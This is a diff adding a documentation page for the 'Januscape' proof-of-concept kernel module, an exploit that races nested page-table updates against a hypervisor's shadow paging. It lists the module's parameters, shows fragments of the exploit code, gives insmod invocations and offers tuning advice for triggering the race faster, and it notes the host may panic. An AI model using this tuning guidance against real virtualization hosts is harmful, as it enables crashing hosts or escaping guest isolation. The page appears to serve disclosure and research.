@@ -1,0 +1,134 @@
+---
+title: "Januscape PoC Kernel Module Parameters"
+sidebarTitle: "Module Parameters"
+description: "All configurable kernel module parameters for poc.ko: amd, nvcpu, dwell, run_ms, diag, and nflood — with defaults, types, and tuning guidance."
+---
+
+`poc.ko` exposes six `module_param` variables that let you tune the exploit's
+virtualization backend, kthread count, race timing, diagnostic verbosity, and
+shadow page cache pressure. All parameters are read-only after load (mode
+`0444`) and are passed as `key=value` arguments to `insmod`. The defaults are
+chosen to work on a wide range of hardware with no extra flags required.
+
+## Parameter Reference
+
+The declarations from `poc.c` are reproduced below for reference:
+
+```c
+static int amd = 0;
+module_param(amd, int, 0444);
+static int nvcpu = 8;
+module_param(nvcpu, int, 0444);
+static int dwell = 256;
+module_param(dwell, int, 0444);
+static int run_ms = 600000;
+module_param(run_ms, int, 0444);
+static int diag = 1;
+module_param(diag, int, 0444);
+static int nflood = 0;
+module_param(nflood, int, 0444);
+```
+
+---
+
+<ParamField path="amd" type="int" default="0">
+  Selects the virtualization backend.
+
+  | Value | Backend |
+  |-------|---------|
+  | `0`   | Intel VMX / EPT (default) |
+  | `1`   | AMD SVM / NPT |
+
+  Must match the host CPU architecture. Loading with the wrong value causes the
+  module to abort immediately with a `CPU lacks VMX/SVM` error.
+
+  **Example — AMD host:**
+  ```bash
+  sudo insmod poc.ko amd=1
+  ```
+</ParamField>
+
+<ParamField path="nvcpu" type="int" default="8">
+  Number of vCPU kthreads to launch. The actual count is capped at
+  `num_online_cpus()` at load time. Thread roles are assigned as follows:
+
+  ```c
+  role_of[cpu] = (cpu == 0)             ? R_WRITER :
+                 (cpu <= nflood && !amd) ? R_FLOOD :
+                                            R_FAULT;
+  ```
+
+  Exactly one thread (cpu 0) is always the **writer**. The remaining threads
+  are either **flood** threads (Intel only, controlled by `nflood`) or
+  **faulter** threads. Higher values increase race contention between faulters
+  and the writer's page-track callback, which generally shortens the time to
+  trigger.
+</ParamField>
+
+<ParamField path="dwell" type="int" default="256">
+  Number of `cpu_relax()` spins inserted between each PDE toggle. The writer
+  thread alternates between writing a huge-page PTE and a table PTE at
+  `nest_pd[PDE_IDX]`; `dwell` controls how long it pauses at each state:
+
+  ```c
+  nest_pd[PDE_IDX] = ops->huge_pte(greg_pa);   /* huge → */
+  for (k = 0; k < dwell; k++) cpu_relax();
+  nest_pd[PDE_IDX] = ops->tbl_pte(ptg_pa);     /* ← table */
+  for (k = 0; k < dwell; k++) cpu_relax();
+  ```
+
+  Lower values increase toggle frequency. Higher values widen the
+  race window per toggle. The default of `256` is a middle ground that works
+  reliably across typical guest CPU counts.
+</ParamField>
+
+<ParamField path="run_ms" type="int" default="600000">
+  Maximum race duration in milliseconds (default: 10 minutes). If the race has
+  not triggered within this window, the writer thread sets `stop_all = 1` and
+  the module self-terminates.
+
+  Set to `0` for an indefinite run — the module will keep racing until it is
+  manually removed with `rmmod poc` or the host panics.
+</ParamField>
+
+<ParamField path="diag" type="int" default="1">
+  Diagnostic output verbosity level written to the kernel log.
+
+  | Level | Output |
+  |-------|--------|
+  | `0`   | Silent — no kernel log output after the initial step banners |
+  | `1`   | Basic lifecycle messages: backend selection, step banners, per-million write counts, and final SVM exit statistics (default) |
+  | `2`   | All of level 1, plus per-vmexit statistics, `0x4141` probe logging when a faulter reads the `q` page, and periodic SVM histogram lines |
+</ParamField>
+
+<ParamField path="nflood" type="int" default="0">
+  Number of EPT-pointer flood vCPUs. **Intel VMX only** — this parameter is
+  ignored when `amd=1`.
+
+  Flood threads do not participate in the writer/faulter race. Instead, each
+  flood thread cycles through `NPRESS` (200) different pre-built EPT roots on
+  every vmexit, stressing the host's shadow page cache eviction path:
+
+  ```c
+  #define NPRESS 200
+  ...
+  vmwrite_(EPT_POINTER, press_root[r % NPRESS]);
+  ```
+
+  Adding flood threads increases shadow page cache pressure on the host, which
+  can widen the race window by delaying shadow page cleanup. Use `nflood=4` as
+  a starting point on hosts with 16 or more physical CPUs.
+</ParamField>
+
+## Usage Examples
+
+```bash
+# Intel — aggressive settings with EPT flood threads and verbose diagnostics:
+sudo insmod poc.ko nvcpu=16 nflood=4 dwell=128 diag=2
+
+# AMD — extended 30-minute timeout with default thread count:
+sudo insmod poc.ko amd=1 run_ms=1800000
+
+# Minimal run — single faulter, silent output, indefinite duration:
+sudo insmod poc.ko nvcpu=2 diag=0 run_ms=0
+```
